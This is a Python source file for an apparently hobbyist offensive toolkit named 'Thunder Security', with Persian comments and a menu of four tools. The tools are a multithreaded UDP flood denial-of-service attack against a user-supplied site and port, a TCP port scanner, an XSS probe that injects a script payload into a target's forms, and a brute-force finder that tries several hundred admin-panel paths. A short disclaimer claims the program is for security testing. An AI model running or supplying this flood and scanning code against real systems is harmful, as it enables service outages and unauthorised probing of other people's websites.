import socket
import time 
import os 
from  colorama import Fore
import requests
import sys 
import webbrowser
import _thread
import threading
from queue import Queue
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin 


def dos_menu():
    dos_text =Fore.GREEN+  "dos Menu"
    data_dos = 0
    while data_dos <= len(dos_text):
        os.system("cls")
        print(dos_text[:data_dos])
        data_dos = data_dos+1
        time.sleep (0.1)
    time.sleep(2)
    print(Fore.GREEN +'''[1 : dos ]
[2 : back]

''')#گذینه های داس و برگشت را بساز 
    time.sleep(2)
    def dos_1(): # دف داس را بساز 
        print ('''      Examples like this unlabeled (https), (http) 

          it's wrong(https://guardiran.org/)
          But this is true(guardiran.org)


        ''')

        site = input("url :  ")# سایت رو بگیر از کاربر 
        thread_count = input("=thread => ")# تعداد پکت هارو بگیر 
        ip = socket.gethostbyname(site) # تبدیل ای پی حروفی به عددی 
        UDP_PORT = int(input("port : "))# پورت رو بگیر معمولا 80 میزارم 
        MESSAGE = 'thunder' # زیاد مهم نی 
        print("UDP target IP:", ip)# ای پی تارگت رو پرینت کن 
        print("UDP target port:", UDP_PORT)# پورت رو پرینت کن
        time.sleep(3)# زمان رو برای 3 ثانیه نگه دار 
        def dos(i): # دف داس رو با یه ای میسازیم 
            while 1:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)# یک شی از سوکت میسازیم
                sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT)) # سوکت رو به مسیج و ای پی و پورت میفرستیم 
                print("Packet Sent") # چاپ کن بکت ارسال شد :/
        for i in range(int(thread_count)): # برای اون ای که ساختیم از ترد ها یه رنج بگیر 
            try: # سعی کن 
               _thread.start_new_thread(dos, ("Thread-" + str(i),)) 
            except KeyboardInterrupt:
                sys.exit(0)
        while 1:
            pass
        vorodi_back_or_run_4 = int(input('''[1 : menu ] 
[2 : exit ]
[3 : return]


Select number : '''))
        if vorodi_back_or_run_4 == 1 :
            menu_and_text()
        if vorodi_back_or_run_4 == 2 :
            sys.exit()
        if vorodi_back_or_run_4 == 3 :
            os.system("cls")
            dos_1()
            
    vorodi_Dos = int(input("Select number : "))
    if vorodi_Dos == 1:
        os.system("cls")
        dos_1() 
    if vorodi_Dos == 2 : 
        menu_and_text()

def port_scan():
    port_text =Fore.GREEN+  "port scanner Menu"
    data_port = 0
    while data_port <= len(port_text):
        os.system("cls")
        print(port_text[:data_port])
        data_port =data_port+1
        time.sleep (0.1)
    print('''[1 : port scan ] 
[2 : back]
    ''')
    def scan():#شروع ساخت اسکنر
        print_lock = threading.Lock()
        print('''

    Examples like this unlabeled (https), (http) 
        it's wrong(https://guardiran.org/)
          But this is true(guardiran.org) or (ipv4 , ipv6)



        ''')
        target = input("url or ip : ")
        def portscan(port):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                con = s.connect((target,port))
                with print_lock:
                    print('[+]','port',port)
                con.close()
            except:
                pass
        def threader():
            while True:
                worker = q.get()
                portscan(worker)
                q.task_done()
        q = Queue()
        for x in range(30):
            t = threading.Thread(target=threader)
            t.daemon = True
            t.start()
        start = time.time()
        for worker in range(1,7000):
            q.put(worker)
        q.join()

        vorodi_back_or_run_3 = int(input('''
[1 : menu ]
[2 : exit ]
[3 : return]


Select number : '''))
        if vorodi_back_or_run_3 == 1 :
            menu_and_text()
        if vorodi_back_or_run_3 == 2 :
            sys.exit()
        if vorodi_back_or_run_3 == 3 :
            os.system("cls")
            scan()
    vorodi_port = int(input("Select number : "))
    if vorodi_port == 1:
        os.system("cls")
        scan()
    if vorodi_port == 2 : 
        menu_and_text()
    
def xss_menu():
    xss_text = "xss menu"
    data_xss = 0 
    while data_xss <=len(xss_text):
        os.system("cls")
        print(xss_text[:data_xss])
        data_xss = data_xss+1
        time.sleep (0.1)
    time.sleep (0.2)
    print(Fore.GREEN+'''[1 : xss ]
[2 : back ]

''') #خب بازم منو رو میسازم 
    def xss():# یه دف برای پیدا کردن باگ ایکس اس اس یا همون سی اس اس تغیر یافته
        print("Example : https://xss-game.appspot.com/level1/frame")
        def get_all_forms(url): #  همه فرم ها را از اچ تی ام ال برمیگردونه(url)با توحه به 
            soup = bs(requests.get(url).content, "html.parser")
            return soup.find_all("form")
        def get_form_details(form):#این تابع تمام اطلاعات مفید از یک فرم اچ تی ام الی استخراج میکنه 
            details = {}
            action = form.attrs.get("action").lower()
            method = form.attrs.get("method", "get").lower()
            inputs = []
            for input_tag in form.find_all("input"):
                input_type = input_tag.attrs.get("type", "text")
                input_name = input_tag.attrs.get("name")
                inputs.append({"type": input_type, "name": input_name})
            details["action"] = action
            details["method"] = method
            details["inputs"] = inputs
            return details

        def submit_form(form_details, url, value):#   اصلی که حاوی ان فرم است مقدار اس تی ار این به همه ورودی های متن و جستجو جایگزین میشود پس از ارسال فرم پاسخ اچ تی تی پی را برمی گرداندurl(str):URL  ارسال میکند و فورم دیتیل (فهرست)بعد از بخش  (form_details)فرمی رو در 
            target_url = urljoin(url, form_details["action"])
            inputs = form_details["inputs"]
            data = {}
            for input in inputs:
                if input["type"] == "text" or input["type"] == "search":
                    input["value"] = value
                input_name = input.get("name")        
                input_value = input.get("value")
                if input_name and input_value:
                    data[input_name] = input_value
            if form_details["method"] == "post":
                return requests.post(target_url, data=data)
            else:    
                return requests.get(target_url, params=data)
        def scan_xss(url): #    اگر اسیب پذیری درست باشد  و در غیر این صورت نادرست باشد ان را برمیگرداندxss تمام فرم های اسیب پذیر   url   با توجه به 
            try :
                forms = get_all_forms(url)
                print(f"[+] Detected {len(forms)} forms on {url}.")
                js_script = "<Script>alert('hi')</scripT>"
                is_vulnerable = False
                for form in forms:
                    form_details = get_form_details(form)
                    content = submit_form(form_details, url, js_script).content.decode()
                if js_script in content:    
                    print(f"[+] XSS Detected on {url}")
                    print(f"[*] Form details:")
                    pprint(form_details)
                    is_vulnerable = True            
                return is_vulnerable
            except:
                print("not found")
        if __name__ == "__main__":    
            url = input("url : ") # میگیریمش input رو یادتونه میام اینجا از طریق  url  اون 
        print(scan_xss(url))
        time.sleep(5)
        vorodi_back_or_run_2 = int(input('''[1 : menu ]
[2 : exit ]
[3 : return]


Select number : '''))
        if vorodi_back_or_run_2 == 1 :
            menu_and_text()
        if vorodi_back_or_run_2 == 2 :
            sys.exit()
        if vorodi_back_or_run_2 == 3 :
            os.system("cls")
            xss()
    vorodi_xss = int(input("Select number : "))
    if vorodi_xss == 1:
        os.system("cls")
        xss() 
    if vorodi_xss == 2 : 
        menu_and_text()

def Admin_Finder_menu():
    admin_text =Fore.GREEN+  "Admin Finder menu"
    data_Admin = 0
    while data_Admin <= len(admin_text):
        os.system("cls")
        print(admin_text[:data_Admin])
        data_Admin = data_Admin+1
        time.sleep (0.1)
    time.sleep(2)
    print(Fore.GREEN+'''[1 : Admin_Finder_scanner ]
[2 : back ]

    ''')
    def Admin_Finder_scanner():
        try:#سعی میکنیم 
            print ( "Example(guardiran.org)")
            target = input("url : ")# تارگتمون رو از کاربر میگیریم
            patch = ['admin/','#/login','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','admin/account.php','admin/index.php','admin/login.php','admin/admin.php','admin/account.php',
'admin_area/admin.php','admin_area/login.php','siteadmin/login.php','siteadmin/index.php','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/index.php','bb-admin/index.php','bb-admin/login.php','bb-admin/admin.php','admin/home.php','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.php','admin.php','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.php','cp.php','administrator/index.php','administrator/login.php','nsw/admin/login.php','webadmin/login.php','admin/admin_login.php','admin_login.php',
'administrator/account.php','administrator.php','admin_area/admin.html','pages/admin/admin-login.php','admin/admin-login.php','admin-login.php',
'bb-admin/index.html','bb-admin/login.html','acceso.php','bb-admin/admin.html','admin/home.html','login.php','modelsearch/login.php','moderator.php','moderator/login.php',
'moderator/admin.php','account.php','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.php','admincontrol.php',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.php','adminarea/index.html','adminarea/admin.html',
'webadmin.php','webadmin/index.php','webadmin/admin.php','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.php','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.php','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.php','wp-login.php','adminLogin.php','admin/adminLogin.php','home.php','admin.php','adminarea/index.php',
'adminarea/admin.php','adminarea/login.php','panel-administracion/index.php','panel-administracion/admin.php','modelsearch/index.php',
'modelsearch/admin.php','admincontrol/login.php','adm/admloginuser.php','admloginuser.php','admin2.php','admin2/login.php','admin2/index.php','usuarios/login.php',
'adm/index.php','adm.php','affiliate.php','adm_auth.php','memberadmin.php','administratorlogin.php','admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','account.asp','admin/account.asp','admin/index.asp','admin/login.asp','admin/admin.asp',
'admin_area/admin.asp','admin_area/login.asp','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/admin.html','admin_area/login.html','admin_area/index.html','admin_area/index.asp','bb-admin/index.asp','bb-admin/login.asp','bb-admin/admin.asp',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','admin/controlpanel.html','admin.html','admin/cp.html','cp.html',
'administrator/index.html','administrator/login.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html','moderator.html',
'moderator/login.html','moderator/admin.html','account.html','controlpanel.html','admincontrol.html','admin_login.html','panel-administracion/login.html',
'admin/home.asp','admin/controlpanel.asp','admin.asp','pages/admin/admin-login.asp','admin/admin-login.asp','admin-login.asp','admin/cp.asp','cp.asp',
'administrator/account.asp','administrator.asp','acceso.asp','login.asp','modelsearch/login.asp','moderator.asp','moderator/login.asp','administrator/login.asp',
'moderator/admin.asp','controlpanel.asp','admin/account.html','adminpanel.html','webadmin.html','pages/admin/admin-login.html','admin/admin-login.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','user.asp','user.html','admincp/index.asp','admincp/login.asp','admincp/index.html',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','adminarea/index.html','adminarea/admin.html','adminarea/login.html',
'panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html','admin/admin_login.html',
'admincontrol/login.html','adm/index.html','adm.html','admincontrol.asp','admin/account.asp','adminpanel.asp','webadmin.asp','webadmin/index.asp',
'webadmin/admin.asp','webadmin/login.asp','admin/admin_login.asp','admin_login.asp','panel-administracion/login.asp','adminLogin.asp',
'admin/adminLogin.asp','home.asp','admin.asp','adminarea/index.asp','adminarea/admin.asp','adminarea/login.asp','admin-login.html',
'panel-administracion/index.asp','panel-administracion/admin.asp','modelsearch/index.asp','modelsearch/admin.asp','administrator/index.asp',
'admincontrol/login.asp','adm/admloginuser.asp','admloginuser.asp','admin2.asp','admin2/login.asp','admin2/index.asp','adm/index.asp',
'adm.asp','affiliate.asp','adm_auth.asp','memberadmin.asp','administratorlogin.asp','siteadmin/login.asp','siteadmin/index.asp','siteadmin/login.html','admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','admin/account.cfm','admin/index.cfm','admin/login.cfm','admin/admin.cfm','admin/account.cfm',
'admin_area/admin.cfm','admin_area/login.cfm','siteadmin/login.cfm','siteadmin/index.cfm','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/index.cfm','bb-admin/index.cfm','bb-admin/login.cfm','bb-admin/admin.cfm','admin/home.cfm','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.cfm','admin.cfm','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.cfm','cp.cfm','administrator/index.cfm','administrator/login.cfm','nsw/admin/login.cfm','webadmin/login.cfm','admin/admin_login.cfm','admin_login.cfm',
'administrator/account.cfm','administrator.cfm','admin_area/admin.html','pages/admin/admin-login.cfm','admin/admin-login.cfm','admin-login.cfm',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cfm','modelsearch/login.cfm','moderator.cfm','moderator/login.cfm',
'moderator/admin.cfm','account.cfm','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cfm','admincontrol.cfm',
'admin/adminLogin.html','acceso.cfm','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cfm','adminarea/index.html','adminarea/admin.html',
'webadmin.cfm','webadmin/index.cfm','webadmin/admin.cfm','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cfm','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cfm','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.cfm','wp-login.cfm','adminLogin.cfm','admin/adminLogin.cfm','home.cfm','admin.cfm','adminarea/index.cfm',
'adminarea/admin.cfm','adminarea/login.cfm','panel-administracion/index.cfm','panel-administracion/admin.cfm','modelsearch/index.cfm',
'modelsearch/admin.cfm','admincontrol/login.cfm','adm/admloginuser.cfm','admloginuser.cfm','admin2.cfm','admin2/login.cfm','admin2/index.cfm','usuarios/login.cfm',
'adm/index.cfm','adm.cfm','affiliate.cfm','adm_auth.cfm','memberadmin.cfm','administratorlogin.cfm','admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','admin/account.js','admin/index.js','admin/login.js','admin/admin.js','admin/account.js',
'admin_area/admin.js','admin_area/login.js','siteadmin/login.js','siteadmin/index.js','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/index.js','bb-admin/index.js','bb-admin/login.js','bb-admin/admin.js','admin/home.js','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.js','admin.js','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.js','cp.js','administrator/index.js','administrator/login.js','nsw/admin/login.js','webadmin/login.js','admin/admin_login.js','admin_login.js',
'administrator/account.js','administrator.js','admin_area/admin.html','pages/admin/admin-login.js','admin/admin-login.js','admin-login.js',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.js','modelsearch/login.js','moderator.js','moderator/login.js',
'moderator/admin.js','account.js','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.js','admincontrol.js',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.js','adminarea/index.html','adminarea/admin.html',
'webadmin.js','webadmin/index.js','acceso.js','webadmin/admin.js','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.js','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.js','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.js','wp-login.js','adminLogin.js','admin/adminLogin.js','home.js','admin.js','adminarea/index.js',
'adminarea/admin.js','adminarea/login.js','panel-administracion/index.js','panel-administracion/admin.js','modelsearch/index.js',
'modelsearch/admin.js','admincontrol/login.js','adm/admloginuser.js','admloginuser.js','admin2.js','admin2/login.js','admin2/index.js','usuarios/login.js',
'adm/index.js','adm.js','affiliate.js','adm_auth.js','memberadmin.js','administratorlogin.js','admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','admin/account.cgi','admin/index.cgi','admin/login.cgi','admin/admin.cgi','admin/account.cgi',
'admin_area/admin.cgi','admin_area/login.cgi','siteadmin/login.cgi','siteadmin/index.cgi','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/index.cgi','bb-admin/index.cgi','bb-admin/login.cgi','bb-admin/admin.cgi','admin/home.cgi','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.cgi','admin.cgi','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.cgi','cp.cgi','administrator/index.cgi','administrator/login.cgi','nsw/admin/login.cgi','webadmin/login.cgi','admin/admin_login.cgi','admin_login.cgi',
'administrator/account.cgi','administrator.cgi','admin_area/admin.html','pages/admin/admin-login.cgi','admin/admin-login.cgi','admin-login.cgi',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.cgi','modelsearch/login.cgi','moderator.cgi','moderator/login.cgi',
'moderator/admin.cgi','account.cgi','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.cgi','admincontrol.cgi',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.cgi','adminarea/index.html','adminarea/admin.html',
'webadmin.cgi','webadmin/index.cgi','acceso.cgi','webadmin/admin.cgi','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.cgi','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.cgi','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.cgi','wp-login.cgi','adminLogin.cgi','admin/adminLogin.cgi','home.cgi','admin.cgi','adminarea/index.cgi',
'adminarea/admin.cgi','adminarea/login.cgi','panel-administracion/index.cgi','panel-administracion/admin.cgi','modelsearch/index.cgi',
'modelsearch/admin.cgi','admincontrol/login.cgi','adm/admloginuser.cgi','admloginuser.cgi','admin2.cgi','admin2/login.cgi','admin2/index.cgi','usuarios/login.cgi',
'adm/index.cgi','adm.cgi','affiliate.cgi','adm_auth.cgi','memberadmin.cgi','administratorlogin.cgi','admin/','administrator/','admin1/','admin2/','admin3/','admin4/','admin5/','usuarios/','usuario/','administrator/','moderator/','webadmin/','adminarea/','bb-admin/','adminLogin/','admin_area/','panel-administracion/','instadmin/',
'memberadmin/','administratorlogin/','adm/','admin/account.brf','admin/index.brf','admin/login.brf','admin/admin.brf','admin/account.brf',
'admin_area/admin.brf','admin_area/login.brf','siteadmin/login.brf','siteadmin/index.brf','siteadmin/login.html','admin/account.html','admin/index.html','admin/login.html','admin/admin.html',
'admin_area/index.brf','bb-admin/index.brf','bb-admin/login.brf','bb-admin/admin.brf','admin/home.brf','admin_area/login.html','admin_area/index.html',
'admin/controlpanel.brf','admin.brf','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
'admin/cp.brf','cp.brf','administrator/index.brf','administrator/login.brf','nsw/admin/login.brf','webadmin/login.brfbrf','admin/admin_login.brf','admin_login.brf',
'administrator/account.brf','administrator.brf','acceso.brf','admin_area/admin.html','pages/admin/admin-login.brf','admin/admin-login.brf','admin-login.brf',
'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.brf','modelsearch/login.brf','moderator.brf','moderator/login.brf',
'moderator/admin.brf','account.brf','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.brf','admincontrol.brf',
'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.brf','adminarea/index.html','adminarea/admin.html',
'webadmin.brf','webadmin/index.brf','webadmin/admin.brf','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.brf','moderator.html',
'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.brf','account.html','controlpanel.html','admincontrol.html',
'panel-administracion/login.brf','wp-login.brf','adminLogin.brf','admin/adminLogin.brf','home.brf','admin.brf','adminarea/index.brf',
'adminarea/admin.brf','adminarea/login.brf','panel-administracion/index.brf','panel-administracion/admin.brf','modelsearch/index.brf',
'modelsearch/admin.brf','admincontrol/login.brf','adm/admloginuser.brf','admloginuser.brf','admin2.brf','admin2/login.brf','admin2/index.brf','usuarios/login.brf',
'adm/index.brf','adm.brf','affiliate.brf','adm_auth.brf','memberadmin.brf','administratorlogin.brf']#تگ های پچ رو وارد میکنیم



            for i in patch:#حلقه پچ
                link = ("http://" + target + "/" + i) # i +/ به تارگتمون اچ تی تی پی اضافه میکنیم و 
                re = requests.get(link)#با ریکوست ریسپانس سایتمون رو میگیریم
                check = re.status_code #استست کد میگیریم تو چک
                if check == 200: #اگر ریسپانسمون 200 بود و مساوی با چک 
                	print ("[+] page login found >",link)# لینک که پیج ادمین داره پرینت کن
                else:        # در غیر این صورت 
                    print ("[-] not found ",link)# پرینت کن لینک های که پیج ادمین یافت نشدن
        except:#جواب نداد
	        print ("pls check url or internet !")#چاپ کن داش نتت مشکل داره یا وب سایتی که دادی مشکل داره لینکش
        vorodi_back_or_run_1 = int(input('''[1 : menu ]
[2 : exit ]
[3 : return]


Select number : '''))
            
        if vorodi_back_or_run_1 == 1 :#اگر که ورودی ما برابر با 1 بود بیا و برو در منو تکست 
            menu_and_text()
        
        if vorodi_back_or_run_1 == 2 :#اگر که ورودی ما برابر با دو بود بیا و مارو  از کل برنامه بکش بیرون 
            sys.exit()
        if vorodi_back_or_run_1 == 3 :#اگر که ورودی  مساوی بود با سه بیا کارو از نو بگیر و اجرا کن 
            os.system("cls")
            Admin_Finder_scanner()

    vorodi_admin = int(input("Select number : "))
    if vorodi_admin == 1:
        os.system("cls")
        Admin_Finder_scanner()
    if vorodi_admin == 2 : 
        menu_and_text()
    

def Rules_menu_text():
    Rules_text = (Fore.GREEN+  "Rules : ")
    data_Rules = 0
    while data_Rules <= len(Rules_text):
        os.system("cls")
        print(Rules_text[:data_Rules])
        data_Rules = data_Rules+1
        time.sleep (0.1)
    time.sleep(2)
    print(Fore.GREEN +''' 
    
      This app is only designed to perform security tests on websites.
        You are responsible for using the program
           I have no responsibility for your actions!





[1 : back]     
[2 : exit]

    ''')
    vorodi_rules = int(input("Select number : "))
    if vorodi_rules ==1:
        os.system("cls")
        menu_and_text()
    if vorodi_rules == 2: 
        sys.exit()

def update_text():
    update_text = (Fore.GREEN+  "Update : ")
    data_update = 0
    while data_update <= len(update_text):
        os.system("cls")
        print(update_text[:data_update])
        data_update = data_update+1
        time.sleep (0.1)
    def Update():
        print('''

         Please download the latest version!


        ''')

        webbrowser.open("https://github.com/BlackRose021/Thunder-security")
        time.sleep(2)
        menu_and_text()
    time.sleep(2)
    print('''

       This code and program is updated every month 
         so that you have the best use and the least possible bugs
           in this code or program.   
--------------------------------------------------------------------------

[1 : Update]
[2 : back]
[3 : exit]
    ''')

    vorodi_update_text = int(input("Select number : "))
    if vorodi_update_text == 1 : 
        os.system("cls")
        Update()
    if vorodi_update_text == 2 :
        menu_and_text()
    if vorodi_update_text == 3 :
        sys.exit()

def menu_and_text():
    menu_text =Fore.GREEN+  "Menu"
    data_menu = 0
    while data_menu <= len(menu_text):
        os.system("cls")
        print(menu_text[:data_menu])
        data_menu = data_menu+1
        time.sleep (0.1)
    os.system("cls")
    print('''


                                                                                                                                                  
                                                                                                                                             
                                                                                                                                             
                                                                                                                                             
                                                                                                                                                                                                                                                                                      
_________                   _        ______   _______  _______        _______  _______  _______           _______ __________________         
\__   __/|\     /||\     /|( (    /|(  __  \ (  ____ \(  ____ )      (  ____ \(  ____ \(  ____ \|\     /|(  ____ )\__   __/\__   __/|\     /|
   ) (   | )   ( || )   ( ||  \  ( || (  \  )| (    \/| (    )|      | (    \/| (    \/| (    \/| )   ( || (    )|   ) (      ) (   ( \   / )
   | |   | (___) || |   | ||   \ | || |   ) || (__    | (____)|      | (_____ | (__    | |      | |   | || (____)|   | |      | |    \ (_) / 
   | |   |  ___  || |   | || (\ \) || |   | ||  __)   |     __)      (_____  )|  __)   | |      | |   | ||     __)   | |      | |     \   /  
   | |   | (   ) || |   | || | \   || |   ) || (      | (\ (               ) || (      | |      | |   | || (\ (      | |      | |      ) (   
   | |   | )   ( || (___) || )  \  || (__/  )| (____/\| ) \ \__      /\____) || (____/\| (____/\| (___) || ) \ \_____) (___   | |      | |   
   )_(   |/     \|(_______)|/    )_)(______/ (_______/|/   \__/      \_______)(_______/(_______/(_______)|/   \__/\_______/   )_(      \_/   
                                                                                                                                             





    ''')
    print(Fore.GREEN +'''



[1 : dos menu]
[2 : Port scanner menu ]
[3 :xss  menu]
[4 :Admin Finder scanner menu]



[5 : Rules]          [6 : update]          [7 : exit]



    ''')
    vorodi_menu = int(input("Select number : "))
    if vorodi_menu == 1 :
        dos_menu()
    if vorodi_menu == 2:
        port_scan()
    if vorodi_menu == 3:
        xss_menu()
    if vorodi_menu == 4: 
        Admin_Finder_menu()
    if vorodi_menu == 5 :
        Rules_menu_text()
    if vorodi_menu == 6 :
        update_text()
    if vorodi_menu == 7 :
        sys.exit()
menu_and_text()
